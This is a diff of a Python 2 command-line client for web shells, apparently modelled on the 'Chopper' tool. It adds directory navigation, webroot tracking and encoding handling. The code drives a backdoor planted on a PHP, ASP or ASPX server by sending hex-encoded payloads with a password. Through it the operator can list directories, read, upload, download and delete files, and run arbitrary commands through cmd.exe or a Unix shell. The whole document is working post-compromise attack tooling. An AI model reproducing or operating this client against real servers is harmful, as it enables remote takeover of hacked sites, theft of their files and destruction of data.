@@ -6,15 +6,15 @@ import sys
 import binascii
 import urllib2
 import optparse
-
+import string
 session_url='http://127.0.0.1/test.php'
 session_pwd='cmd'
 session_type='php'
 session_user=''
 session_dir=''
 session_cmd=''
+session_webroot=''
 session_encoding=''
-
 def getencode():
     data1 = urllib.urlopen(session_url).read()
     chardit1 = chardet.detect(data1)
@@ -22,14 +22,14 @@ def getencode():
 
 def functions():
     print "\033[;31m**********************************************************"
+    print "\033[;31mmail:1289675768@qq.com author:net2\033[1;m"
     print "\033[;31mls    [dir]             列目录\033[1;m"
     print "\033[;31mcat   [file]            查看文件\033[1;m"
     print "\033[;31mup    [local] [remote]  上传 \033[1;m"
     print "\033[;31mdown  [remote] [local]  下载\033[1;m"
     print "\033[;31mdel   [file]            删除\033[1;m"
-    print "\033[;31mcmd                     命令行\033[1;m"
+    print "\033[;31mcmd   [cmd.exe]         命令行,可自定义cmd.exe路径\033[1;m"
     print "\033[;31mpwd                     会话路径\033[1;m"
-    print "\033[;31mwhoami                  会话用户\033[1;m"
     print "\033[;31mhelp                    帮助 \033[1;m"
     print "\033[;31mexit                    退出\033[1;m"
     print "\033[;31m**************************************************************\033[1;m"
@@ -340,12 +340,6 @@ response.write "|<-"
 
 
 def viewdir(dir):
-    print dir
-    
-    #dir=base64.b64encode(directory)
-    #print session_url
-    #print session_pwd
-    #print php_dirlist_code
     if(session_type=='php'):
         data={session_pwd:binascii.b2a_hex(php_dir),'z1':dir}
     elif(session_type=='aspx'):
@@ -354,7 +348,6 @@ def viewdir(dir):
         data={session_pwd:binascii.b2a_hex(asp_dir),'z1':dir}        
         
  
-    
     data=urllib.urlencode(data)
     req=urllib2.Request(session_url)
     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
@@ -363,10 +356,19 @@ def viewdir(dir):
     num1=content.find('->|')+3
     num2=content.find('|<-')
     info=content[num1:num2]
+    print "**************************************************************".center(50)
+    print "*****",dir.center(50),"*****"
+    print "**************************************************************".center(50)
     print info
 
+
 def upload(localfile,remotefile):
-    
+    print 'localfile:',localfile
+    try:
+        remotefile=remotefile.decode('utf-8').encode(session_encoding)
+    except:
+        remotefile=remotefile
+    print 'remotefile:',remotefile
     try:
         f=file(localfile,'rb')
         content=binascii.b2a_hex(f.read())
@@ -380,7 +382,8 @@ def upload(localfile,remotefile):
         req=urllib2.Request(session_url)
         req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
         response = urllib2.urlopen(req,data)
-        content=response.read().decode(session_encoding).encode('utf-8')
+        content=response.read()
+        #content=response.read().decode(session_encoding).encode('utf-8')
         num1=content.find('->|')+3
         num2=content.find('|<-')
         info=content[num1:num2]
@@ -407,7 +410,8 @@ def upload(localfile,remotefile):
             req=urllib2.Request(session_url)
             req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
             response = urllib2.urlopen(req,data)
-            webcontent=response.read().decode(session_encoding).encode('utf-8')
+            #webcontent=response.read().decode(session_encoding).encode('utf-8')
+            webcontent=response.read()
             #print webcontent
             num1=webcontent.find('->|')+3
             num2=webcontent.find('|<-')
@@ -421,11 +425,12 @@ def upload(localfile,remotefile):
 
 
 def download(remotefile,localfile):
-    
-    
-    #print session_url
-    #print session_pwd
-    #print php_dirlist_code
+    try:
+        remotefile=remotefile.decode('utf-8').encode(session_encoding)
+    except:
+        remotefile=remotefile
+    print 'remotefile:',remotefile
+    print 'localfile:',localfile
     if(session_type=='php'):
         data={session_pwd:binascii.b2a_hex(php_download),'z1':base64.b64encode(remotefile)}
     elif(session_type=='aspx'):
@@ -436,7 +441,8 @@ def download(remotefile,localfile):
     req=urllib2.Request(session_url)
     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
     response = urllib2.urlopen(req,data)
-    content=response.read().decode(session_encoding).encode('utf-8')
+    content=response.read()
+    #content=response.read().decode(session_encoding).encode('utf-8')
     num1=content.find('->|')+3
     num2=content.find('|<-')
     info=content[num1:num2]
@@ -454,8 +460,11 @@ def download(remotefile,localfile):
         print 'download success!'
 
 def readfile(filename):
-    
-    
+    try:
+        filename=filename.decode('utf-8').encode(session_encoding)
+    except:
+        filename=filename
+    print 'filename:',filename
     if(session_type=='php'):
         data={session_pwd:binascii.b2a_hex(php_readfile),'z1':base64.b64encode(filename)}
     elif(session_type=='aspx'):
@@ -466,18 +475,25 @@ def readfile(filename):
     req=urllib2.Request(session_url)
     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
     response = urllib2.urlopen(req,data)
-    content=response.read().decode(session_encoding).encode('utf-8')
+    try:
+        content=response.read().decode(session_encoding).encode('utf-8')
+    except:
+        content=response.read()
+        #content=response.read().decode(session_encoding).encode('utf-8')
+    #print 'content:',content
     num1=content.find('->|')+3
     num2=content.find('|<-')
     info=content[num1:num2]
+    print "**************************************************************".center(50)
+    print "*****",filename.decode(session_encoding).encode('utf-8').center(50),"*****"
+    print "**************************************************************".center(50)
     print info
 
 def delfile(filename):
-    
-    
-    #print session_url
-    #print session_pwd
-    #print php_dirlist_code
+    try:
+        filename=filename.decode('utf-8').encode(session_encoding)
+    except:
+        filename=filename
     if(session_type=='php'):
         data={session_pwd:binascii.b2a_hex(php_del),'z1':filename}
     elif(session_type=='aspx'):
@@ -494,22 +510,26 @@ def delfile(filename):
     num2=content.find('|<-')
     info=content[num1:num2]
     #print info
+    print "**************************************************************".center(50)
+    print "*****del",filename.decode(session_encoding).encode('utf-8').center(50),"*****"
+    print "**************************************************************".center(50)
     if(info=='1'):
         print "ok!"
     else:
         print "error!"
 
 def cmd(cmdbash="cmd.exe",command=""):
-    global session_dir  
+    print 'cmdbash:',cmdbash
+    global session_webroot  
     global session_cmd
     global session_user
     
     session_cmd=cmdbash
     cmdbash1=base64.b64encode(session_cmd)
-    if session_dir[0:1]=='/':
-        command="cd "+session_dir+";"+command+';echo [directory];pwd;echo [/directory]'
+    if session_webroot[0:1]=='/':
+        command="cd "+session_webroot+";"+command+';echo [directory];pwd;echo [/directory]'
     else:
-        command="cd /d "+session_dir+"&"+command+'&echo [directory]&&cd&&echo [/directory]'
+        command="cd /d "+session_webroot+"&"+command+'&echo [directory]&&cd&&echo [/directory]'
     command1=base64.b64encode(command)
     if(session_type=='php'):
         data={session_pwd:binascii.b2a_hex(php_cmd),'z1':cmdbash1,'z2':command1}
@@ -523,27 +543,43 @@ def cmd(cmdbash="cmd.exe",command=""):
     req=urllib2.Request(session_url)
     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
     response = urllib2.urlopen(req,data)
-
-    content=response.read().decode(session_encoding).encode('utf-8')
+    try:
+        content=response.read().decode(session_encoding).encode('utf-8')
+    except:
+        content=response.read()
     num1=content.find('->|')+3
     num2=content.find('|<-')
     num3=content.find('[directory]')
     num4=content.find('[/directory]')
     
-    session_dir=content[num3+11:num4].strip()
-    #print "directory:-------"+session_dir
+    session_webroot=content[num3+11:num4].strip()
+    #print "directory:-------"+session_webroot
     info=content[num1:num3].strip()
     print info
     while True:
-        command=raw_input(session_dir+"@"+session_user+"$:")
+        command=raw_input(session_webroot+"@"+session_user+"$:")
         if command.strip()=='exit':
 	    connected()
 	else:
 	    cmd(session_cmd,command)
-     
+    
+
+def changdir(dir):
+    global session_dir
+    #print 'dir',dir
+    if dir=='..\\' or dir=='..' or dir=='dir ../':
+        num=session_dir.rfind('/')
+	session_dir=session_dir[0:num]
+    
+    elif dir[0:1] in string.ascii_letters and dir[1:2]==':' or dir[0:1]=='/':
+        session_dir=dir
+    else:
+        session_dir=session_dir+'/'+dir
+
 def connected():
     global session_dir
     global session_user
+    global session_webroot
     if(session_type=='php'):
         data={session_pwd:binascii.b2a_hex(php_info)}
     elif(session_type=='asp'):
@@ -559,38 +595,59 @@ def connected():
     num2=content.find('|<-')
     info=content[num1:num2]
     if len(info)>0:
-        print "success,connected......."
-        print "*****************************************************"
+        print "\033[;31msuccess,connected......."
+        print "*****************************************************\033[1;m"
         print info
         functions()
         num3=info.find('\t')
         num4=info.find('(')
         num5=info.find(')')
         session_dir=info[0:num3]
-        print "session_dir:",session_dir
         session_user=info[num4+1:num5].lower()
         if session_type=='asp':
-            session_user='aspuser'
-        print "session_user:",session_user
+            session_user='unknown'
+        session_webroot=session_dir
+	print "webuser:",session_user
+        print "webroot:",session_webroot
         while True:
-            action=raw_input("input command>:").strip().split()
-            if len(action)==0:
+            action=raw_input(session_dir.decode(session_encoding).encode('utf-8')+"@input command>:").strip().split()
+	    if len(action)==0:
 	        pass
+	    elif action[0]=='cd':
+	        if len(action)==1:
+		    print 'currendir:\033[;31m%s\033[1;m'%session_dir
+		    print 'webroot:\033[;31m%s\033[1;m'%session_webroot
+		elif action[1]=='webroot':
+                    changdir(session_webroot)
+		else:
+		    action[1]=action[1].decode('utf-8').encode(session_encoding)
+		    changdir(action[1])
 	    elif len(action)==1 and action[0]=='?':
 	        functions()
 	    elif action[0]=='ls' or action[0]=='dir':
 	        if len(action)==1:
 		    viewdir(session_dir)
 		else:
+		    action[1]=action[1].decode('utf-8').encode(session_encoding)
 		    viewdir(action[1])
-            elif action[0]=='cat':
-                readfile(action[1])
-            elif action[0]=='up':
+            elif action[0]=='cat' and len(action)==2:
+		filename=action[1].decode('utf-8').encode(session_encoding)
+		if filename[0:1] in string.ascii_letters and filename[1:2]==':' or filename[0:1]=='/':
+                    filename=filename
+                else:
+                    filename=session_dir+'/'+filename
+                readfile(filename)
+            elif action[0]=='up' and len(action)==3:
                 upload(action[1],action[2])
-            elif action[0]=='down':
+            elif action[0]=='down' and len(action)==3:
                 download(action[1],action[2])
-            elif action[0]=='del':
-                delfile(action[1])
+            elif action[0]=='del' and len(action)==2:
+		filename=action[1].decode('utf-8').encode(session_encoding)
+                if filename[0:1] in string.ascii_letters and filename[1:2]==':' or filename[0:1]=='/':
+                    filename=filename
+                else:
+                    filename=session_dir+'/'+filename
+                delfile(filename)
             elif action[0]=='cmd':
                 if len(action)==1:
                     cmd()
